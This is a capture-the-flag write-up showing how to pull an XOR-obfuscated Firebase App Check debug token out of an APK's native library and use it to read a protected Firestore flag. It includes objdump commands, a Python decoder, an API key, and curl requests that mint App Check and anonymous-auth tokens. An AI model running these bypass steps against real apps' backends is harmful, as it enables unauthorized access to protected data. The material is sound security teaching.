# [03] The Vault — Writeup

**Points:** 300
**Category:** Firebase / Reverse Engineering
**Flag:** `FAM{4pp_ch3ck_byp4ss_g00d_j0b}`

## Challenge

> The vault trusts no one it hasn't met. But the app already made introductions. Something in the code proves who you are.
>
> hint: the token is hiding in plain sight

Same APK as challenges 01/02: `fam-ctf.apk`

## Thought process

The phrase *"proves who you are"* reads like an identity/attestation mechanism, and given the previous challenge was plain Firebase Auth, this one had to be something adjacent but distinct — **Firebase App Check**, which attests that requests come from the *genuine app* (not a user identity, an app identity). Static analysis of the DEX in challenge 01/02 had already surfaced supporting evidence: a class named `DebugTokenAppCheckProvider`/`DebugTokenAppCheckProviderFactory`, a native method `getDebugToken()`, and API endpoints like `exchangeDebugToken` and `firebaseappcheck.googleapis.com`. App Check has a well-known "debug token" escape hatch for local development — exactly what "the app already made introductions" was gesturing at: the app registers itself with a debug token so the backend already recognizes it.

The hint — *"the token is hiding in plain sight"* — suggested the debug token itself was a discoverable constant, most likely embedded the same way challenge 01's secret was: as plaintext in `libfam.so`. That guess was half right and half a trap (see below).

## The trap I fell into

My first instinct was to treat this exactly like challenge 02: get an anonymous auth token and read a `flag3` node directly off the **Realtime Database**, the same backend used for challenge 2's flag. I spent a long stretch of the challenge:

- Grepping the APK for UUID-shaped debug tokens in plaintext (none existed in the DEX — only referenced by name).
- Disassembling `getDebugToken()` in `libfam.so` with `objdump` and correctly recovering the token via its XOR-table decoding scheme.
- Exchanging that debug token for a real App Check token via `exchangeDebugToken`.
- Then repeatedly hammering the **Realtime Database** — `/flag3`, `/vault`, `/flags`, `/secret`, etc. — with combinations of the App Check token and/or the anonymous auth token. Every single one came back `401 Permission denied`.

The trap: because App Check appeared to be irrelevant to challenge 2 (the `/flag` node in RTDB was readable by anonymous auth alone, no App Check header needed), I wrongly generalized that **App Check wasn't enforced anywhere in this project**, and kept assuming the missing piece must be a differently-named RTDB node or a stricter security rule on the same database. In reality, App Check enforcement was scoped to a *different backend entirely* — the data for this stage wasn't in the Realtime Database at all, it was in **Cloud Firestore**, which the app *did* gate behind App Check. No amount of RTDB node-name guessing was ever going to find it, because I was pointed at the wrong storage product.

The fix was to stop guessing endpoints and go read the actual client code that decides where the flag is fetched from. That code was sitting right there in the DEX the whole time — I just hadn't decompiled it into readable Java/Kotlin yet, only picked at strings and disassembly. A quick decompile of `MainActivity` with jadx showed `verifyFlag3()` doing:

```kotlin
FirebaseFirestore.getInstance()
    .collection("flags")
    .document("flag3")
    .get()
    .addOnSuccessListener { it.getString("value") }
```

That one method body ended the guessing immediately: correct backend (Firestore, not RTDB), correct collection/document path, correct field name.

**Lesson:** when a hint says something is "proven" by the app, or when static/dynamic recon starts producing plausible-looking tokens or credentials that don't unlock anything, stop probing blindly and go read (or decompile) the exact code path that consumes them. The code will name the backend, the path, and the required headers exactly — guessing costs far more requests than reading one function.

## Steps

### 1. Recover the debug token from native code

The Java layer only declares `getDebugToken()` as a native method — no token string in the DEX. The actual value is constructed inside `libfam.so`. Disassembling with `objdump`:

```bash
objdump -d --start-address=0x6c30 --stop-address=0x6e10 -M intel extracted/lib/x86_64/libfam.so
```

showed a loop building a 36-character string (`0x24` bytes — UUID length) with the decode:

```
output[i] = tableB[i] XOR (tableA[i % 19] XOR 0xAA)
```

Dumping the two byte tables referenced via RIP-relative addressing:

```bash
objdump -s -j .rodata --start-address=0x34e0 --stop-address=0x3540 extracted/lib/x86_64/libfam.so
```

`tableA` (19 bytes) at `0x34f0`, `tableB` (36 bytes) at `0x3510`. Reproducing the XOR in Python:

```python
tableA = bytes.fromhex("ecebe7f5d999c9d899def5c199d3f5989a989c")
tableB = bytes.fromhex("7e077a694606543 61e356c5e72546b70050 31b7f75096b5e77 5336754d672f04401d0705".replace(" ",""))
out = [tableB[i] ^ (tableA[i % 19] ^ 0xAA) for i in range(0x24)]
print(bytes(out).decode())
```

Result:
```
8F76557D-A35A-4B51-94D4-D0DF98D79B55
```

That was the debug token "hiding in plain sight" — plaintext, just XOR-obfuscated rather than stored raw.

### 2. Exchange the debug token for a real App Check token

```bash
curl -s -X POST \
  "https://firebaseappcheck.googleapis.com/v1/projects/674578159678/apps/1:674578159678:android:775058d15777caf841996f:exchangeDebugToken" \
  -H "Content-Type: application/json" \
  -H "X-Goog-Api-Key: AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww" \
  -d '{"debugToken":"8F76557D-A35A-4B51-94D4-D0DF98D79B55"}'
```

This returned a signed App Check JWT with a 1-hour TTL — confirming the token was valid, even though it wasn't yet clear what it unlocked.

### 3. (The detour) Hammer the wrong backend

Spent significant effort trying combinations of this App Check token and an anonymous Firebase Auth ID token against the Realtime Database:

```bash
curl "$RTDB/flag3.json?auth=$IDTOKEN" -H "X-Firebase-AppCheck: $AC_TOKEN"
# {"error" : "Permission denied"}  — every node name tried, every combination
```

All attempts returned `401`/`Permission denied`. This was the trap described above — the right credentials, aimed at the wrong storage product.

### 4. Decompile MainActivity and read the actual flag3 logic

```bash
java -jar jadx-cli.jar -d app_src --no-res extracted/classes3.dex
```

`verifyFlag3()` in the decompiled source revealed the real target:

```kotlin
FirebaseFirestore.getInstance().collection("flags").document("flag3").get()
    .addOnSuccessListener { it.getString("value") }
```

Firestore, collection `flags`, document `flag3`, field `value` — not Realtime Database at all.

### 5. Read the correct resource with both tokens

```bash
IDTOKEN=$(curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" -d '{"returnSecureToken":true}' \
  | python -c "import sys,json;print(json.load(sys.stdin)['idToken'])")

curl -s "https://firestore.googleapis.com/v1/projects/fam-ctf/databases/(default)/documents/flags/flag3" \
  -H "Authorization: Bearer $IDTOKEN" \
  -H "X-Firebase-AppCheck: $AC_TOKEN"
```

Response:
```json
{
  "fields": { "value": { "stringValue": "FAM{4pp_ch3ck_byp4ss_g00d_j0b}" } }
}
```

## Tools used

- `objdump` — disassemble the native `getDebugToken()` function and locate its XOR lookup tables in `.rodata`
- Python — reimplement the XOR-decode to recover the plaintext debug token
- `curl` — exchange the debug token for an App Check token, sign in anonymously, and issue the final Firestore REST read
- `jadx` (CLI) — decompile the DEX to Java/Kotlin source, which is what actually revealed the correct backend/path/field (the step that ended the trap)

## Key takeaway

Firebase App Check's debug-token bypass is meant purely for local development — any client that knows a project's debug token can mint a valid App Check attestation, same as any client that knows an API key can sign in anonymously. Obfuscating the token (XOR against a table) inside a native library doesn't add real security, only a speed bump for static analysis.

The bigger lesson, though, was procedural rather than cryptographic: when recon produces a valid-looking credential that still doesn't open the door, resist the urge to keep varying request parameters against the same guessed target. Different Firebase products (Realtime Database vs. Firestore vs. Cloud Storage) have independent security rules and independent App Check enforcement toggles — a credential proven to work against one tells you nothing about the others. Decompiling the client and reading the one function that fetches the flag is faster and more reliable than enumerating storage backends and node names by hand.
